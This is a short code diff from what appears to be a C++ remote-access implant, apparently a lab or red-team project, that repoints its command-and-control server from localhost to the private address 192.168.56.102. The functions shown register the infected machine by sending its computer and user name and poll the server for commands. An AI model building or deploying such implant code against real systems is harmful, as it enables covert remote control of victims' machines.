@@ -247,7 +247,7 @@ std::string register_implant(char* compName, char* userName) {
     std::wstring uri = L"/register";
 
     // construct the url
-    std::wstring fqdn = L"localhost";
+    std::wstring fqdn = L"192.168.56.102";
 
     // construct the http method
     std::wstring http_method = L"POST";
@@ -301,7 +301,7 @@ std::string checkin_implant(std::string response, std::wstring imageNum) {
     std::wstring uri = L"/commands";
 
     // construct the url
-    std::wstring fqdn = L"localhost";
+    std::wstring fqdn = L"192.168.56.102";
 
     // construct the http method
     std::wstring http_method = L"POST";
